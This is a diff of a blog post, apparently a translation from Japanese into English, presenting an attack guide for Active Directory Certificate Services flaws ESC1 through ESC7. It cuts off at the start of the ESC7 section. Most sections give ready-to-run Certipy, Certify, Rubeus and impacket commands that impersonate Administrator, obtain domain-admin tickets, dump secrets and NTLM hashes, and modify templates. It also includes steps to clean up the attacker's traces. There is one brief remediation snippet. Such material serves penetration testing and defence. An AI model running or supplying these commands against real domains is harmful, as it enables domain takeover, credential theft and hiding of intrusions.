@@ -1,313 +1,314 @@
 ---
-title: "AD CS 脆弱性 (ESC1-16) 完全攻撃ガイド"
+title: "AD CS Attack Guide: ESC1–ESC16 Complete Reference"
 date: 2026-03-03
-description: "Active Directory Certificate Services の ESC1〜ESC16 全脆弱性について、攻撃条件・シーケンス図・実行コマンドを詳細に解説する。"
+description: "A comprehensive reference covering all ESC1–ESC16 Active Directory Certificate Services vulnerabilities — attack conditions, sequence diagrams, and exploitation commands."
 categories: [TechBlog]
 tags: [active-directory, adcs, certificate-services, kerberos, privilege-escalation, windows, pentest]
 mermaid: true
 ---
 
+# AD CS Vulnerabilities (ESC1–16) Complete Attack Guide
 
-全ての ESC 攻撃について、シーケンス図・攻撃条件・実行コマンドを詳細に記載
+Detailed sequence diagrams, attack conditions, and execution commands for every ESC attack.
 
 ---
 
 ## ESC1: Enrollee-Supplied Subject for Client Authentication
 
-### 攻撃条件
+### Attack Conditions
 
-- ✅ 証明書テンプレートが **Client Authentication** または **Smart Card Logon** EKU を持つ
-- ✅ テンプレートに **CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT** フラグが設定されている
-- ✅ 低特権ユーザーに **Enroll** 権限がある
-- ✅ 証明書の承認が不要（または攻撃者が承認権限を持つ）
+- ✅ The certificate template has **Client Authentication** or **Smart Card Logon** EKU
+- ✅ The template has the **CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT** flag set
+- ✅ A low-privileged user has **Enroll** permission
+- ✅ Certificate approval is not required (or the attacker holds approval rights)
 
-### 攻撃フロー
+### Attack Flow
 
 ```mermaid
 sequenceDiagram
     autonumber
-    participant A as 攻撃者<br/>(低特権ユーザー)
+    participant A as Attacker<br/>(Low-Privileged User)
     participant Certify as Certify.exe /<br/>Certipy
-    participant T as 脆弱なテンプレート<br/>(ESC1_Template)
+    participant T as Vulnerable Template<br/>(ESC1_Template)
     participant CA as Certificate Authority<br/>(CA01)
     participant DC as Domain Controller
-    
-    Note over A,DC: 前提: テンプレートスキャン完了
-    
+
+    Note over A,DC: Prerequisite: Template scan completed
+
     A->>Certify: Certify.exe find /vulnerable
-    Certify->>A: ESC1 脆弱性を発見:<br/>VulnerableTemplate
-    
-    Note over A: 攻撃実行: Administrator になりすます
-    
+    Certify->>A: ESC1 vulnerability found:<br/>VulnerableTemplate
+
+    Note over A: Execute attack: impersonate Administrator
+
     A->>Certify: Certify.exe request<br/>/ca:CA01\ca-CA01<br/>/template:VulnerableTemplate<br/>/altname:Administrator
-    
-    Certify->>T: 証明書リクエスト作成
+
+    Certify->>T: Build certificate request
     Note over Certify: Subject Alternative Name:<br/>Administrator@corp.local
-    
-    Certify->>CA: 証明書登録要求
-    CA->>CA: テンプレート設定確認
-    Note over CA: CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT<br/>フラグが有効 → SAN 指定を許可
-    
-    CA->>Certify: Administrator 証明書発行<br/>(PFX形式)
-    Certify->>A: cert.pfx を保存
-    
-    Note over A: Kerberos 認証で証明書を使用
-    
+
+    Certify->>CA: Certificate enrollment request
+    CA->>CA: Check template configuration
+    Note over CA: CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT<br/>flag is enabled → SAN specification allowed
+
+    CA->>Certify: Issue Administrator certificate<br/>(PFX format)
+    Certify->>A: Save cert.pfx
+
+    Note over A: Use certificate for Kerberos authentication
+
     A->>Certify: Rubeus.exe asktgt<br/>/user:Administrator<br/>/certificate:cert.pfx<br/>/password:password<br/>/ptt
-    
-    Certify->>DC: TGT リクエスト<br/>(証明書認証)
-    DC->>DC: 証明書検証
-    Note over DC: SAN: Administrator@corp.local<br/>→ Administrator として認証
-    
-    DC->>Certify: Administrator TGT 発行
-    Certify->>A: TGT をメモリに注入 (Pass-the-Ticket)
-    
-    Note over A: Domain Admin 権限取得完了
-    A->>DC: Domain Admin として操作
+
+    Certify->>DC: TGT request<br/>(certificate authentication)
+    DC->>DC: Validate certificate
+    Note over DC: SAN: Administrator@corp.local<br/>→ Authenticate as Administrator
+
+    DC->>Certify: Issue Administrator TGT
+    Certify->>A: Inject TGT into memory (Pass-the-Ticket)
+
+    Note over A: Domain Admin privileges obtained
+    A->>DC: Operate as Domain Admin
 ```
 
-### 攻撃コマンド
+### Attack Commands
 
-**1. 脆弱性スキャン (Windows)**
+**1. Vulnerability Scan (Windows)**
 
 ```powershell
-# Certify でスキャン
+# Scan with Certify
 .\Certify.exe find /vulnerable
 
-# 特定のテンプレートを詳細確認
+# Detailed check of a specific template
 .\Certify.exe find /template:VulnerableTemplate
 ```
 
-**2. 脆弱性スキャン (Linux/Kali)**
+**2. Vulnerability Scan (Linux/Kali)**
 
 ```bash
-# Certipy でスキャン
+# Scan with Certipy
 certipy find -u john@corp.local -p 'Password123!' -dc-ip 10.10.10.100 -vulnerable
 
-# 結果を BloodHound で確認
+# Review results with BloodHound
 certipy find -u john@corp.local -p 'Password123!' -dc-ip 10.10.10.100 -bloodhound
 ```
 
-**3. 証明書要求 (Windows)**
+**3. Certificate Request (Windows)**
 
 ```powershell
-# Administrator の証明書を要求
+# Request a certificate for Administrator
 .\Certify.exe request /ca:DC01\corp-DC01-CA /template:VulnerableTemplate /altname:Administrator
 
-# 発行された証明書を PFX に変換
+# Convert the issued certificate to PFX
 certutil -decode cert.pem cert.pfx
 ```
 
-**4. 証明書要求 (Linux/Kali)**
+**4. Certificate Request (Linux/Kali)**
 
 ```bash
-# 証明書要求と取得を一度に実行
+# Request and retrieve certificate in one step
 certipy req -u john@corp.local -p 'Password123!' -dc-ip 10.10.10.100 -ca 'corp-DC01-CA' -template 'VulnerableTemplate' -upn 'administrator@corp.local'
 
-# 出力: administrator.pfx
+# Output: administrator.pfx
 ```
 
-**5. TGT 取得と認証 (Windows)**
+**5. Obtain TGT and Authenticate (Windows)**
 
 ```powershell
-# Rubeus で TGT を取得
+# Obtain TGT with Rubeus
 .\Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /password:password /ptt
 
-# 確認
+# Verify
 klist
 whoami
 ```
 
-**6. TGT 取得と認証 (Linux/Kali)**
+**6. Obtain TGT and Authenticate (Linux/Kali)**
 
 ```bash
-# Certipy で TGT を取得
+# Obtain TGT with Certipy
 certipy auth -pfx administrator.pfx -dc-ip 10.10.10.100
 
-# 出力: administrator.ccache (TGT)
+# Output: administrator.ccache (TGT)
 
-# TGT を使用
+# Use TGT
 export KRB5CCNAME=administrator.ccache
 impacket-secretsdump -k -no-pass corp.local/administrator@dc01.corp.local
 ```
 
-**7. NTLM ハッシュ取得 (オプション)**
+**7. Obtain NTLM Hash (Optional)**
 
 ```bash
-# UnPAC the hash 技術で NTLM ハッシュ取得
+# Retrieve NTLM hash using the UnPAC the hash technique
 certipy auth -pfx administrator.pfx -dc-ip 10.10.10.100
 
-# 出力: Administrator の NTLM ハッシュ
-# Pass-the-Hash で使用可能
+# Output: Administrator's NTLM hash
+# Usable with Pass-the-Hash
 ```
 
 ---
 
 ## ESC2: Any Purpose Certificate Template
 
-### 攻撃条件
+### Attack Conditions
 
-- ✅ 証明書テンプレートが **Any Purpose EKU** (`2.5.29.37.0`) を持つ、または EKU が未定義
-- ✅ 低特権ユーザーに **Enroll** 権限がある
-- ✅ 証明書の承認が不要
+- ✅ The certificate template has **Any Purpose EKU** (`2.5.29.37.0`), or no EKU is defined
+- ✅ A low-privileged user has **Enroll** permission
+- ✅ Certificate approval is not required
 
-### 攻撃フロー
+### Attack Flow
 
 ```mermaid
 sequenceDiagram
     autonumber
-    participant A as 攻撃者
+    participant A as Attacker
     participant Certify as Certify.exe
     participant T as Any Purpose<br/>Template
     participant CA as Certificate Authority
     participant DC as Domain Controller
-    
+
     A->>Certify: Certify.exe find /vulnerable
-    Certify->>A: ESC2 検出:<br/>AnyPurposeTemplate<br/>(EKU: Any Purpose)
-    
-    Note over A: Any Purpose EKU は<br/>Client Authentication を含む全ての用途で使用可能
-    
+    Certify->>A: ESC2 detected:<br/>AnyPurposeTemplate<br/>(EKU: Any Purpose)
+
+    Note over A: Any Purpose EKU can be used for all purposes,<br/>including Client Authentication
+
     A->>Certify: Certify.exe request<br/>/ca:CA01\ca-CA01<br/>/template:AnyPurposeTemplate<br/>/altname:Administrator
-    
-    Note over Certify: ESC1 と同様に SAN を指定できる場合もある<br/>できない場合は自分の証明書のみ
-    
-    Certify->>CA: 証明書リクエスト
-    CA->>Certify: Any Purpose EKU 証明書発行
-    
-    Note over A: Client Authentication として使用可能
-    
-    A->>Certify: Rubeus.exe asktgt<br/>/user:攻撃者 or Administrator<br/>/certificate:cert.pfx<br/>/ptt
-    
-    Certify->>DC: TGT リクエスト
-    DC->>DC: EKU 確認: Any Purpose<br/>→ Client Authentication として有効
-    DC->>Certify: TGT 発行
-    Certify->>A: 認証成功
+
+    Note over Certify: SAN can sometimes be specified as in ESC1;<br/>otherwise only your own certificate
+
+    Certify->>CA: Certificate request
+    CA->>Certify: Issue Any Purpose EKU certificate
+
+    Note over A: Can be used as Client Authentication
+
+    A->>Certify: Rubeus.exe asktgt<br/>/user:Attacker or Administrator<br/>/certificate:cert.pfx<br/>/ptt
+
+    Certify->>DC: TGT request
+    DC->>DC: Check EKU: Any Purpose<br/>→ Valid as Client Authentication
+    DC->>Certify: Issue TGT
+    Certify->>A: Authentication successful
 ```
 
-### 攻撃コマンド
+### Attack Commands
 
-**1. 脆弱性スキャン**
+**1. Vulnerability Scan**
 
 ```bash
-# ESC2 を特定
+# Identify ESC2
 certipy find -u john@corp.local -p 'Password123!' -dc-ip 10.10.10.100 -vulnerable -stdout | grep -i "ESC2"
 ```
 
-**2. 証明書要求 (SAN 指定可能な場合)**
+**2. Certificate Request (when SAN can be specified)**
 
 ```bash
-# Administrator として証明書要求
+# Request certificate as Administrator
 certipy req -u john@corp.local -p 'Password123!' -dc-ip 10.10.10.100 -ca 'corp-DC01-CA' -template 'AnyPurposeTemplate' -upn 'administrator@corp.local'
 ```
 
-**3. 証明書要求 (SAN 指定不可の場合)**
+**3. Certificate Request (when SAN cannot be specified)**
 
 ```bash
-# 自分の証明書のみ取得
+# Obtain only your own certificate
 certipy req -u john@corp.local -p 'Password123!' -dc-ip 10.10.10.100 -ca 'corp-DC01-CA' -template 'AnyPurposeTemplate'
 
-# 他の ESC 攻撃と組み合わせる必要がある
+# Must be combined with another ESC attack
 ```
 
 ---
 
 ## ESC3: Enrollment Agent Certificate Template
 
-### 攻撃条件
+### Attack Conditions
 
-- ✅ 証明書テンプレートが **Certificate Request Agent EKU** (`1.3.6.1.4.1.311.20.2.1`) を持つ
-- ✅ 低特権ユーザーに **Enroll** 権限がある
-- ✅ 別の証明書テンプレートが **Application Policy** で Enrollment Agent を許可
-- ✅ または **Issuance Requirements** で Enrollment Agent が無制限
+- ✅ The certificate template has **Certificate Request Agent EKU** (`1.3.6.1.4.1.311.20.2.1`)
+- ✅ A low-privileged user has **Enroll** permission
+- ✅ Another certificate template allows Enrollment Agent under **Application Policy**
+- ✅ Or **Issuance Requirements** imposes no restriction on Enrollment Agent
 
-### 攻撃フロー
+### Attack Flow
 
 ```mermaid
 sequenceDiagram
     autonumber
-    participant A as 攻撃者
+    participant A as Attacker
     participant Certify as Certify.exe
     participant EA as Enrollment Agent<br/>Template
     participant CA as Certificate Authority
     participant CT as Client Auth<br/>Template
     participant DC as Domain Controller
-    
-    Note over A: フェーズ 1: Enrollment Agent 証明書取得
-    
+
+    Note over A: Phase 1: Obtain Enrollment Agent certificate
+
     A->>Certify: Certify.exe find /vulnerable
-    Certify->>A: ESC3 検出:<br/>EnrollmentAgentTemplate
-    
+    Certify->>A: ESC3 detected:<br/>EnrollmentAgentTemplate
+
     A->>Certify: Certify.exe request<br/>/ca:CA01\ca-CA01<br/>/template:EnrollmentAgentTemplate
-    
-    Certify->>CA: Enrollment Agent 証明書要求
-    CA->>Certify: Enrollment Agent 証明書発行<br/>(agent.pfx)
-    
-    Note over A: フェーズ 2: 他ユーザーの代理登録
-    
+
+    Certify->>CA: Enrollment Agent certificate request
+    CA->>Certify: Issue Enrollment Agent certificate<br/>(agent.pfx)
+
+    Note over A: Phase 2: Enroll on behalf of another user
+
     A->>Certify: Certify.exe request<br/>/ca:CA01\ca-CA01<br/>/template:User<br/>/onbehalfof:CORP\Administrator<br/>/enrollcert:agent.pfx<br/>/enrollcertpw:password
-    
-    Note over Certify: Enrollment Agent として<br/>Administrator の証明書を代理要求
-    
-    Certify->>CT: Administrator の証明書要求
-    CT->>CA: 代理登録リクエスト
-    CA->>CA: Enrollment Agent 検証
-    Note over CA: agent.pfx の署名を確認<br/>→ 代理登録を許可
-    
-    CA->>Certify: Administrator 証明書発行<br/>(admin.pfx)
-    
-    Note over A: フェーズ 3: 認証
-    
+
+    Note over Certify: Request Administrator's certificate<br/>on behalf as Enrollment Agent
+
+    Certify->>CT: Request Administrator's certificate
+    CT->>CA: On-behalf-of enrollment request
+    CA->>CA: Validate Enrollment Agent
+    Note over CA: Verify agent.pfx signature<br/>→ Allow on-behalf-of enrollment
+
+    CA->>Certify: Issue Administrator certificate<br/>(admin.pfx)
+
+    Note over A: Phase 3: Authentication
+
     A->>Certify: Rubeus.exe asktgt<br/>/user:Administrator<br/>/certificate:admin.pfx<br/>/ptt
-    
-    Certify->>DC: TGT リクエスト
+
+    Certify->>DC: TGT request
     DC->>Certify: Administrator TGT
-    Certify->>A: Domain Admin 権限取得
+    Certify->>A: Domain Admin privileges obtained
 ```
 
-### 攻撃コマンド
+### Attack Commands
 
-**1. 脆弱性スキャン**
+**1. Vulnerability Scan**
 
 ```bash
-# ESC3 を特定
+# Identify ESC3
 certipy find -u john@corp.local -p 'Password123!' -dc-ip 10.10.10.100 -vulnerable -stdout | grep -A 20 "ESC3"
 ```
 
-**2. Enrollment Agent 証明書取得**
+**2. Obtain Enrollment Agent Certificate**
 
 ```bash
-# フェーズ 1: Enrollment Agent 証明書取得
+# Phase 1: Obtain Enrollment Agent certificate
 certipy req -u john@corp.local -p 'Password123!' -dc-ip 10.10.10.100 -ca 'corp-DC01-CA' -template 'EnrollmentAgent'
 
-# 出力: john.pfx (Enrollment Agent 証明書)
+# Output: john.pfx (Enrollment Agent certificate)
 ```
 
-**3. 代理登録で Administrator 証明書取得**
+**3. Obtain Administrator Certificate via On-Behalf-Of Enrollment**
 
 ```bash
-# フェーズ 2: Administrator の証明書を代理要求
+# Phase 2: Request Administrator's certificate on behalf
 certipy req -u john@corp.local -p 'Password123!' -dc-ip 10.10.10.100 -ca 'corp-DC01-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'
 
-# 出力: administrator.pfx
+# Output: administrator.pfx
 ```
 
-**4. 認証**
+**4. Authentication**
 
 ```bash
-# TGT 取得
+# Obtain TGT
 certipy auth -pfx administrator.pfx -dc-ip 10.10.10.100
 ```
 
-**Windows での実行**
+**Windows Execution**
 
 ```powershell
-# フェーズ 1
+# Phase 1
 .\Certify.exe request /ca:DC01\corp-DC01-CA /template:EnrollmentAgent
 
-# フェーズ 2
+# Phase 2
 .\Certify.exe request /ca:DC01\corp-DC01-CA /template:User /onbehalfof:CORP\Administrator /enrollcert:agent.pfx /enrollcertpw:password
 
-# フェーズ 3
+# Phase 3
 .\Rubeus.exe asktgt /user:Administrator /certificate:admin.pfx /ptt
 ```
 
@@ -315,88 +316,88 @@ certipy auth -pfx administrator.pfx -dc-ip 10.10.10.100
 
 ## ESC4: Template Hijacking
 
-### 攻撃条件
+### Attack Conditions
 
-- ✅ 攻撃者が証明書テンプレートへの **WriteProperty** または **WriteDACL** 権限を持つ
-- ✅ テンプレートを ESC1 の条件を満たすように変更可能
+- ✅ The attacker has **WriteProperty** or **WriteDACL** rights on the certificate template
+- ✅ The template can be modified to satisfy ESC1 conditions
 
-### 攻撃フロー
+### Attack Flow
 
 ```mermaid
 sequenceDiagram
     autonumber
-    participant A as 攻撃者
+    participant A as Attacker
     participant AD as Active Directory
-    participant T as 証明書テンプレート<br/>(変更前)
-    participant T2 as 証明書テンプレート<br/>(変更後)
+    participant T as Certificate Template<br/>(Before Modification)
+    participant T2 as Certificate Template<br/>(After Modification)
     participant CA as Certificate Authority
     participant DC as Domain Controller
-    
-    Note over A: フェーズ 1: 権限確認
-    
-    A->>AD: Get-Acl 確認
-    AD->>A: WriteProperty / WriteDACL 権限あり
-    
-    Note over A: フェーズ 2: テンプレート変更
-    
+
+    Note over A: Phase 1: Check permissions
+
+    A->>AD: Check Get-Acl
+    AD->>A: WriteProperty / WriteDACL rights present
+
+    Note over A: Phase 2: Modify template
+
     A->>T: Set-ADObject<br/>msPKI-Certificate-Name-Flag<br/>+= CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT
-    
-    T->>T2: 設定変更
-    Note over T2: SAN 指定が可能に
-    
+
+    T->>T2: Apply configuration change
+    Note over T2: SAN specification now possible
+
     A->>T2: Set-ADObject<br/>msPKI-Certificate-Application-Policy<br/>+= Client Authentication
-    
-    Note over T2: Client Authentication EKU 追加
-    
-    A->>T2: Set-ADObject<br/>Add-ACE Enroll 権限<br/>for Domain Users
-    
-    Note over T2: 誰でも登録可能に
-    
-    Note over A: フェーズ 3: ESC1 攻撃実行
-    
+
+    Note over T2: Client Authentication EKU added
+
+    A->>T2: Set-ADObject<br/>Add-ACE Enroll permission<br/>for Domain Users
+
+    Note over T2: Anyone can now enroll
+
+    Note over A: Phase 3: Execute ESC1 attack
+
     A->>T2: Certify.exe request<br/>/template:ModifiedTemplate<br/>/altname:Administrator
-    
-    T2->>CA: 証明書要求
-    CA->>A: Administrator 証明書発行
-    
+
+    T2->>CA: Certificate request
+    CA->>A: Issue Administrator certificate
+
     A->>DC: Rubeus.exe asktgt<br/>/certificate:cert.pfx<br/>/ptt
     DC->>A: Domain Admin TGT
-    
-    Note over A: フェーズ 4: 痕跡削除 (オプション)
-    
-    A->>T2: テンプレート設定を元に戻す
+
+    Note over A: Phase 4: Clean up traces (optional)
+
+    A->>T2: Revert template settings to original
 ```
 
-### 攻撃コマンド
+### Attack Commands
 
-**1. 権限確認**
+**1. Check Permissions**
 
 ```powershell
-# PowerView で権限確認
+# Check permissions with PowerView
 Import-Module .\PowerView.ps1
 Get-DomainObjectAcl -Identity "VulnerableTemplate" -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "WriteProperty|WriteDacl"}
 ```
 
-**2. テンプレート変更**
+**2. Modify Template**
 
 ```powershell
-# AD モジュールで変更
+# Modify using AD module
 Import-Module ActiveDirectory
 
-# テンプレートの DN を取得
+# Get the template DN
 $template = Get-ADObject -Filter {cn -eq "VulnerableTemplate"} -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local"
 
-# SAN 指定を有効化
+# Enable SAN specification
 Set-ADObject -Identity $template.DistinguishedName -Add @{'msPKI-Certificate-Name-Flag'=1}
 
-# Client Authentication EKU を追加
+# Add Client Authentication EKU
 Set-ADObject -Identity $template.DistinguishedName -Replace @{'pKIExtendedKeyUsage'='1.3.6.1.5.5.7.3.2'}
 ```
 
-**3. Linux から変更 (ldapmodify)**
+**3. Modify from Linux (ldapmodify)**
 
 ```bash
-# LDIF ファイル作成
+# Create LDIF file
 cat > modify_template.ldif << EOF
 dn: CN=VulnerableTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local
 changetype: modify
@@ -404,21 +405,21 @@ replace: msPKI-Certificate-Name-Flag
 msPKI-Certificate-Name-Flag: 1
 EOF
 
-# LDAP で変更を適用
+# Apply changes via LDAP
 ldapmodify -x -H ldap://10.10.10.100 -D "cn=john,cn=users,dc=corp,dc=local" -w 'Password123!' -f modify_template.ldif
 ```
 
-**4. 証明書要求 (変更後)**
+**4. Certificate Request (after modification)**
 
 ```bash
-# ESC1 攻撃を実行
+# Execute ESC1 attack
 certipy req -u john@corp.local -p 'Password123!' -dc-ip 10.10.10.100 -ca 'corp-DC01-CA' -template 'VulnerableTemplate' -upn 'administrator@corp.local'
 ```
 
-**5. 痕跡削除**
+**5. Clean Up Traces**
 
 ```powershell
-# 元の設定に戻す
+# Revert to original settings
 Set-ADObject -Identity $template.DistinguishedName -Replace @{'msPKI-Certificate-Name-Flag'=0}
 ```
 
@@ -426,100 +427,100 @@ Set-ADObject -Identity $template.DistinguishedName -Replace @{'msPKI-Certificate
 
 ## ESC5: Vulnerable PKI Object Access Control
 
-### 攻撃条件
+### Attack Conditions
 
-- ✅ 攻撃者が以下のオブジェクトへの危険な権限を持つ:
-    - 証明書テンプレート: **WriteProperty**, **WriteOwner**, **WriteDACL**
+- ✅ The attacker holds dangerous permissions on the following objects:
+    - Certificate templates: **WriteProperty**, **WriteOwner**, **WriteDACL**
     - CA: **ManageCA**, **ManageCertificates**
-    - CA コンピューター: **WriteProperty** (dNSHostName など)
+    - CA computer: **WriteProperty** (dNSHostName, etc.)
 
-### 攻撃フロー
+### Attack Flow
 
 ```mermaid
 sequenceDiagram
     autonumber
-    participant A as 攻撃者
+    participant A as Attacker
     participant AD as Active Directory
-    participant PKI as PKI オブジェクト
+    participant PKI as PKI Object
     participant CA as Certificate Authority
     participant DC as Domain Controller
-    
-    Note over A: パターン 1: テンプレートへの WriteProperty
-    
-    A->>AD: Get-Acl 確認
-    AD->>A: WriteProperty 権限あり<br/>(証明書テンプレート)
-    
-    A->>PKI: ESC4 と同様にテンプレート変更
-    PKI->>A: 変更完了
-    
-    A->>CA: ESC1 攻撃実行
-    CA->>A: 証明書発行
-    
-    Note over A: パターン 2: CA への ManageCA
-    
+
+    Note over A: Pattern 1: WriteProperty on template
+
+    A->>AD: Check Get-Acl
+    AD->>A: WriteProperty rights present<br/>(certificate template)
+
+    A->>PKI: Modify template as in ESC4
+    PKI->>A: Modification complete
+
+    A->>CA: Execute ESC1 attack
+    CA->>A: Certificate issued
+
+    Note over A: Pattern 2: ManageCA on CA
+
     A->>CA: certutil -config "CA01\ca-CA01"<br/>-setreg policy\EditFlags<br/>+EDITF_ATTRIBUTESUBJECTALTNAME2
-    
-    Note over CA: ESC6 条件を作成
-    
-    CA->>A: 設定変更完了
-    
-    A->>CA: ESC6 攻撃実行
-    CA->>A: 証明書発行
-    
-    Note over A: パターン 3: CA への ManageCertificates
-    
+
+    Note over CA: Create ESC6 condition
+
+    CA->>A: Configuration change complete
+
+    A->>CA: Execute ESC6 attack
+    CA->>A: Certificate issued
+
+    Note over A: Pattern 3: ManageCertificates on CA
+
     A->>CA: certutil -resubmit [RequestId]
-    Note over A: 保留中の証明書要求を承認
-    
-    CA->>A: 証明書発行
-    
-    A->>DC: 証明書で認証
-    DC->>A: TGT 発行
+    Note over A: Approve a pending certificate request
+
+    CA->>A: Certificate issued
+
+    A->>DC: Authenticate with certificate
+    DC->>A: Issue TGT
 ```
 
-### 攻撃コマンド
+### Attack Commands
 
-**1. 権限の列挙**
+**1. Enumerate Permissions**
 
 ```powershell
-# Certify で権限を確認
+# Check permissions with Certify
 .\Certify.exe find /vulnerable
 
-# PowerView で詳細確認
+# Detailed check with PowerView
 Get-DomainObjectAcl -Identity "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" -ResolveGUIDs
 ```
 
-**2. パターン 1: テンプレート変更 (ESC4 と同様)**
+**2. Pattern 1: Modify Template (same as ESC4)**
 
 ```bash
-# ESC4 のコマンドを使用
+# Use ESC4 commands
 ```
 
-**3. パターン 2: ManageCA 権限の悪用**
+**3. Pattern 2: Abuse ManageCA Rights**
 
 ```powershell
-# Windows: EDITF_ATTRIBUTESUBJECTALTNAME2 を有効化
+# Windows: Enable EDITF_ATTRIBUTESUBJECTALTNAME2
 certutil -config "DC01\corp-DC01-CA" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
 
-# CA サービスを再起動
+# Restart CA service
 Invoke-Command -ComputerName DC01 -ScriptBlock { Restart-Service certsvc }
 ```
 
 ```bash
-# Linux: Certipy で設定変更
+# Linux: Change settings with Certipy
 certipy ca -u john@corp.local -p 'Password123!' -dc-ip 10.10.10.100 -ca 'corp-DC01-CA' -enable-template 'SubCA'
 ```
 
-**4. パターン 3: ManageCertificates 権限の悪用**
+**4. Pattern 3: Abuse ManageCertificates Rights**
 
 ```powershell
-# 保留中の要求を確認
+# Review pending requests
 certutil -config "DC01\corp-DC01-CA" -view
 
-# 保留中の要求を承認
+# Approve a pending request
 certutil -config "DC01\corp-DC01-CA" -resubmit [RequestId]
 
-# 証明書を取得
+# Retrieve certificate
 certutil -config "DC01\corp-DC01-CA" -retrieve [RequestId] cert.cer
 ```
 
@@ -527,100 +528,100 @@ certutil -config "DC01\corp-DC01-CA" -retrieve [RequestId] cert.cer
 
 ## ESC6: CA Allows SAN Specification via Request Attributes
 
-### 攻撃条件
+### Attack Conditions
 
-- ✅ CA に **EDITF_ATTRIBUTESUBJECTALTNAME2** フラグが設定されている
-- ✅ 低特権ユーザーが登録可能な証明書テンプレートが存在
-- ✅ テンプレートに **Client Authentication** EKU がある（または Any Purpose）
+- ✅ The CA has the **EDITF_ATTRIBUTESUBJECTALTNAME2** flag set
+- ✅ A certificate template that low-privileged users can enroll in exists
+- ✅ The template has **Client Authentication** EKU (or Any Purpose)
 
-### 攻撃フロー
+### Attack Flow
 
 ```mermaid
 sequenceDiagram
     autonumber
-    participant A as 攻撃者
+    participant A as Attacker
     participant Certify as Certify.exe
-    participant T as 任意のテンプレート
+    participant T as Any Template
     participant CA as Certificate Authority
     participant DC as Domain Controller
-    
-    Note over CA: CA 設定:<br/>EDITF_ATTRIBUTESUBJECTALTNAME2 = Enabled
-    
+
+    Note over CA: CA setting:<br/>EDITF_ATTRIBUTESUBJECTALTNAME2 = Enabled
+
     A->>Certify: Certify.exe find
-    Certify->>A: ESC6 検出:<br/>CA が SAN 指定を許可
-    
-    Note over A: テンプレート自体は脆弱ではないが<br/>CA 設定により攻撃可能
-    
+    Certify->>A: ESC6 detected:<br/>CA allows SAN specification
+
+    Note over A: The template itself is not vulnerable,<br/>but the CA setting makes the attack possible
+
     A->>Certify: Certify.exe request<br/>/ca:CA01\ca-CA01<br/>/template:User<br/>/altname:Administrator
-    
-    Note over Certify: リクエスト属性に SAN を含める:<br/>san:upn=Administrator@corp.local
-    
-    Certify->>T: 証明書要求
-    T->>CA: リクエストを転送
-    
-    CA->>CA: EDITF_ATTRIBUTESUBJECTALTNAME2<br/>フラグを確認
-    Note over CA: フラグが有効<br/>→ リクエスト属性から SAN を読み取る
-    
-    CA->>CA: テンプレートの SAN 制限を無視
-    
-    CA->>Certify: Administrator 証明書発行
-    Note over CA: リクエスト属性の SAN が優先される
-    
+
+    Note over Certify: Include SAN in request attributes:<br/>san:upn=Administrator@corp.local
+
+    Certify->>T: Certificate request
+    T->>CA: Forward request
+
+    CA->>CA: Check EDITF_ATTRIBUTESUBJECTALTNAME2<br/>flag
+    Note over CA: Flag is enabled<br/>→ Read SAN from request attributes
+
+    CA->>CA: Ignore SAN restriction in template
+
+    CA->>Certify: Issue Administrator certificate
+    Note over CA: SAN from request attributes takes priority
+
     Certify->>A: administrator.pfx
-    
+
     A->>Certify: Rubeus.exe asktgt<br/>/user:Administrator<br/>/certificate:administrator.pfx<br/>/ptt
-    
-    Certify->>DC: TGT リクエスト
+
+    Certify->>DC: TGT request
     DC->>Certify: Administrator TGT
-    Certify->>A: Domain Admin 権限取得
+    Certify->>A: Domain Admin privileges obtained
 ```
 
-### 攻撃コマンド
+### Attack Commands
 
-**1. 脆弱性確認**
+**1. Confirm Vulnerability**
 
 ```powershell
-# Windows: CA の設定確認
+# Windows: Check CA settings
 certutil -config "DC01\corp-DC01-CA" -getreg policy\EditFlags
 
-# 出力に EDITF_ATTRIBUTESUBJECTALTNAME2 (0x40000) が含まれるか確認
+# Check if output contains EDITF_ATTRIBUTESUBJECTALTNAME2 (0x40000)
 ```
 
 ```bash
-# Linux: Certipy で確認
+# Linux: Check with Certipy
 certipy find -u john@corp.local -p 'Password123!' -dc-ip 10.10.10.100 -vulnerable -stdout | grep -i "ESC6"
 ```
 
-**2. 証明書要求 (Windows)**
+**2. Certificate Request (Windows)**
 
 ```powershell
-# User テンプレートで Administrator の証明書を要求
+# Request Administrator's certificate using User template
 .\Certify.exe request /ca:DC01\corp-DC01-CA /template:User /altname:Administrator
 ```
 
-**3. 証明書要求 (Linux)**
+**3. Certificate Request (Linux)**
 
 ```bash
-# Certipy で SAN 指定
+# Specify SAN with Certipy
 certipy req -u john@corp.local -p 'Password123!' -dc-ip 10.10.10.100 -ca 'corp-DC01-CA' -template 'User' -upn 'administrator@corp.local'
 
-# 出力: administrator.pfx
+# Output: administrator.pfx
 ```
 
-**4. 認証**
+**4. Authentication**
 
 ```bash
-# TGT 取得
+# Obtain TGT
 certipy auth -pfx administrator.pfx -dc-ip 10.10.10.100
 ```
 
-**5. 修正方法 (防御側)**
+**5. Remediation (Defender)**
 
 ```powershell
-# EDITF_ATTRIBUTESUBJECTALTNAME2 を無効化
+# Disable EDITF_ATTRIBUTESUBJECTALTNAME2
 certutil -config "DC01\corp-DC01-CA" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
 
-# CA サービス再起動
+# Restart CA service
 Restart-Service certsvc
 ```
 
@@ -628,410 +629,410 @@ Restart-Service certsvc
 
 ## ESC7: Dangerous Permissions on CA
 
-### 攻撃条件
+### Attack Conditions
 
-- ✅ 攻撃者が CA への **ManageCA** 権限を持つ
-- ✅ または **ManageCertificates** 権限を持つ
+- ✅ The attacker has **ManageCA** rights on the CA
+- ✅ Or the attacker has **ManageCertificates** rights
 
-### 攻撃フロー
+### Attack Flow
 
 ```mermaid
 sequenceDiagram
     autonumber
-    participant A as 攻撃者
+    participant A as Attacker
     participant CA as Certificate Authority
